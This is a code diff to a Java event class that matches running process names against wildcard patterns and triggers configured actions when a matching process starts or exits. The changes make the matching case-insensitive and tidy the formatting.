@@ -76,7 +76,7 @@ public class EventProcess extends EventBase implements Observer<ProcessInfo> {
 	public int notification(ProcessInfo process) {
 		final String processName = process.processInfo.processName;
 
-		if (!matchStar(starname, processName)) {
+		if (!matchStar(starname.toLowerCase(), processName.toLowerCase())) {
 			return 0;
 		}
 
@@ -89,12 +89,10 @@ public class EventProcess extends EventBase implements Observer<ProcessInfo> {
 		}
 
 		switch (type) {
-		case 0: // Process
-			break;
-
-		case 1: // Window
-		default:
-			break;
+			case 0: // Process
+			case 1: // Window
+			default:
+				break;
 		}
 
 		return 0;
@@ -114,16 +112,19 @@ public class EventProcess extends EventBase implements Observer<ProcessInfo> {
 
 			if (wildcardProcess.charAt(0) == '*') {
 				wildcardProcess = wildcardProcess.substring(1);
+				
 				if (wildcardProcess.length() == 0) {
 					return true;
 				}
 
 				if (wildcardProcess.charAt(0) != '?' && wildcardProcess.charAt(0) != '*') {
 					final int len = processName.length();
+					
 					for (int i = 0; i < len; i++) {
 						final char c = processName.charAt(0);
 						processName = processName.substring(1);
 						final String tp = wildcardProcess.substring(1);
+						
 						if (c == wildcardProcess.charAt(0) && matchStar(tp, processName)) {
 							return true;
 						}
@@ -134,6 +135,7 @@ public class EventProcess extends EventBase implements Observer<ProcessInfo> {
 				for (int i = 0; i < processName.length(); i++) {
 					final char c = processName.charAt(i);
 					processName = processName.substring(1);
+					
 					if (matchStar(wildcardProcess, processName)) {
 						return true;
 					}
@@ -160,6 +162,7 @@ public class EventProcess extends EventBase implements Observer<ProcessInfo> {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (onEnter): triggering " + actionOnEnter + " " + starname) ;//$NON-NLS-1$ //$NON-NLS-2$
 		}
+		
 		trigger(actionOnEnter);
 	}
 
@@ -167,6 +170,7 @@ public class EventProcess extends EventBase implements Observer<ProcessInfo> {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (onExit): triggering " + actionOnExit + " " + starname) ;//$NON-NLS-1$ //$NON-NLS-2$
 		}
+		
 		trigger(actionOnExit);
 	}
 }
